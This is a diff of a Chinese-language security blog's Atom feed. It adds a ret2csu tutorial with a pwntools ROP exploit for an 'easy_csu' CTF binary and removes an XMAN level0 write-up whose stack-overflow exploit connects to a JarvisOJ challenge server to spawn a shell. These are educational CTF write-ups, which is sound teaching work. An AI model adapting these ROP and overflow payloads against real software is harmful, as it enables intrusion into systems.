@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://coldwave96.github.io/"/>
-  <updated>2020-06-11T07:30:27.815Z</updated>
+  <updated>2020-06-15T08:21:07.814Z</updated>
   <id>https://coldwave96.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ret2csu - 万能Gadgets</title>
+    <link href="https://coldwave96.github.io/2020/06/15/Useful-Gadgets/"/>
+    <id>https://coldwave96.github.io/2020/06/15/Useful-Gadgets/</id>
+    <published>2020-06-15T06:09:23.000Z</published>
+    <updated>2020-06-15T08:21:07.814Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&emsp;&emsp;2018年blackhat大会提出了ret2csu，即通过libc_csu_init中两个特殊的gadgets实现64位程序的万能传参。</p><a id="more"></a><p>&emsp;&emsp;libc_csu_init函数功能是对libc进行初始化操作，一般程序都会调用libc函数，所以这个函数基本上都存在，故而称为万能gadgets。</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets1.png" alt=""></p><p>&emsp;&emsp;通过汇编代码可以发现，利用这两个gadgets可以依次实现rbx、rbp、r12、rdx、rsi、edi寄存器的赋值。</p><p>&emsp;&emsp;在x86的程序中，函数的前6个参数的赋值是依次通过rdi、rsi、rdx、rcx、r8、r9寄存器实现。所以上面我们控制的寄存器中，r12、rdx、rsi和edi寄存器更加吸引我们的注意力，因为他们分别保存着将要调用的函数的指针的地址、第三个参数、第二个参数和第一个参数。</p><p>&emsp;&emsp;而rbx和rbp寄存器我们也不能忽视，他们的值必须分别被置为0和1。因为在gadget2中，最后一个指令<code>call [r12 + rbx*8]</code>，将rbx置0则指令将变成<code>call [r12]</code>，方便传参。此外需要注意的是，r12中设置的应该为要调用的函数的指针的地址，即got地址而不是plt地址。</p><p>&emsp;&emsp;因为jne指令与je指令正好相反，只有当零标志ZF=0时跳转，ZF=1时顺序执行下一条指令，即不相等时转移。前一条指令<code>cmp rbx，rbp</code>中rbx再执行完<code>add rbx，0</code>之后必然值为1。所以为了不跳转，必须将rbp的值也置为1，使得汇编指令能够顺序执行而不是跳转到1110行再次执行call指令，这样可能会造成错误。</p><h2 id="Example：easy-csu"><a href="#Example：easy-csu" class="headerlink" title="Example：easy_csu"></a>Example：easy_csu</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>&emsp;&emsp;程序运行截图：</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets2.png" alt=""></p><p>&emsp;&emsp;checksec：64位程序</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets3.png" alt=""></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>&emsp;&emsp;把程序丢到hopper中，发现main函数中read函数存在溢出漏洞：</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets4.png" alt=""></p><p>&emsp;&emsp;看一下vul函数，发现只要调用vul函数，且将vul函数的第3个参数设为3即可：</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets5.png" alt=""></p><p>&emsp;&emsp;由于这是64位的程序，所以通过寄存器传参，但是通过ROPgadget并没有发现可以用的gadgets：</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets6.png" alt=""></p><p>&emsp;&emsp;于是我们就想到万能gadgets：</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets7.png" alt=""></p><p>&emsp;&emsp;所以可以构造这样一个ROP链：首先跳转到loc_4011fe即gadget1给寄存器赋值，然后ret到gadget2将参数转移到需要的寄存器中去，但是gadget2运行后会再次执行一遍gadget1，这样会使得栈空间提升8*7总共56字节，所以我们还需要padding56个字节，然后才能覆盖ret到需要的地址上去。</p><p>&emsp;&emsp;在我们给r12赋值的时候，刚开始的想法是直接填上vul函数的地址。但是根据上面关于ret2csu的介绍，r12中应该置为vul函数指针的地址。所以我们需要找到一个指针，再劫持这个指针指向vul函数……这也太麻烦了，而且这样一来题目的初衷和重心就变了。</p><p>&emsp;&emsp;为了解决这个问题，我们选择一个简单的办法。用init_array_start函数的指针来跳过gadget2中的那条call指令。init_array_start函数是ELF程序的一个初始化函数，运行它不会对栈空间造成影响，可以说是用于跳过call指令的最佳选择。</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>&emsp;&emsp;于是最终的EXP就是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">'./easy_csu'</span>)</span><br><span class="line">* elf = ELF(<span class="string">'easy_csu'</span>)</span><br><span class="line">* </span><br><span class="line">* gadget1 = <span class="number">0x401202</span></span><br><span class="line">* gadget2 = <span class="number">0x4011e8</span></span><br><span class="line">* </span><br><span class="line">* init_addr = elf.symbols[<span class="string">'__init_array_start'</span>]</span><br><span class="line">* vul_addr = elf.symbols[<span class="string">'vul'</span>]</span><br><span class="line">* </span><br><span class="line">* payload = <span class="string">'a'</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>)</span><br><span class="line">* payload += p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(init_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)+ p64(<span class="number">3</span>)</span><br><span class="line">* payload += p64(gadget2) + <span class="string">'a'</span> * <span class="number">56</span></span><br><span class="line">* payload += p64(vul_addr)</span><br><span class="line">* </span><br><span class="line">* sh.sendline(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;EXP运行结果图：</p><p><img src="/img/Useful-Gadgets/Useful-Gadgets8.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;2018年blackhat大会提出了ret2csu，即通过libc_csu_init中两个特殊的gadgets实现64位程序的万能传参。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="Theory" scheme="https://coldwave96.github.io/categories/Theory/"/>
+    
+    
+      <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
+    
+  </entry>
   
   <entry>
     <title>ROP Emporium の pivot</title>
@@ -449,29 +472,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;这是JarvisOJ的PWN题部分[XMAN]level2的Write-Up，题目难度不大，还是栈溢出覆盖返回地址，不过涉及到二次覆盖。可是由于这是32位程序，加上没有什么保护措施，其实这个二次覆盖也很简单，适合Rookie详细了解PWN的机制。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
-    
-    
-      <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XMAN level0 の Write-Up</title>
-    <link href="https://coldwave96.github.io/2020/05/01/XMAN-level0/"/>
-    <id>https://coldwave96.github.io/2020/05/01/XMAN-level0/</id>
-    <published>2020-05-01T07:40:33.000Z</published>
-    <updated>2020-05-12T07:50:00.860Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&emsp;&emsp;这是JarvisOJ的PWN题部分[XMAN]level0的Write-Up，也是第一次尝试PWN题，这题比较简单，就是简单的栈溢出覆盖返回地址，很适合刚上手的Rookie（比如我==）。</p><a id="more"></a><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>&emsp;&emsp;首先checksec一下程序：</p><p><img src="/img/XMAN-level0/XMAN1.png" alt=""></p><p>&emsp;&emsp;checksec是检查程序是否打开或关闭某些保护机制的一个脚本。相关参数意义为：</p><ul><li><p>RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表；</p></li><li><p>Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；</p></li><li><p>NX：NX enabled表示这个保护开启，意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用ROP这种方法绕过；</p></li><li><p>PIE：enabled表示启用内存布局随机化，如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址；</p></li><li><p>FORTIFY：FORTIFY_SOURCE机制对格式化字符串有两个限制：(1)包含%n的格式化字符串不能位于程序内存中的可写地址；(2)当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。</p></li></ul><p>&emsp;&emsp;运行程序如下图所示：</p><p><img src="/img/XMAN-level0/XMAN2.png" alt=""></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>&emsp;&emsp;把程序拖到Hopper Disassambler中看下伪C代码：</p><p><img src="/img/XMAN-level0/XMAN3.png" alt=""></p><p>&emsp;&emsp;函数中有个非常明显的vulnerable_function函数，明确的告诉我们存在漏洞，看下代码果然存在栈溢出漏洞。</p><p>&emsp;&emsp;然后还看到一个callsystem函数，在函数中调用了shell：</p><p><img src="/img/XMAN-level0/XMAN4.png" alt=""></p><p>&emsp;&emsp;这样思路就很简单了，通过vulnerable_function函数的栈溢出覆盖返回地址，跳转到callsystem函数入口调出shell。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>&emsp;&emsp;由vulnerable_function函数可以发现buffer到rbp的距离为0x80字节，加上0x08字节的rbp（64位程序中rbp为8字节，32位程序中为4字节），这样就可以得到vulnerable_function函数的返回地址了，然后把这个返回地址覆盖为callsystem函数的入口地址即可：</p><p><img src="/img/XMAN-level0/XMAN5.png" alt=""></p><h2 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h2><p>&emsp;&emsp;EXP代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./level0')</span></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9881</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level0'</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = elf.symbols[<span class="string">'callsystem'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x80</span> + <span class="number">0x8</span>) + p64(shell_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;这是JarvisOJ的PWN题部分[XMAN]level0的Write-Up，也是第一次尝试PWN题，这题比较简单，就是简单的栈溢出覆盖返回地址，很适合刚上手的Rookie（比如我==）。&lt;/p&gt;
     
     </summary>
     
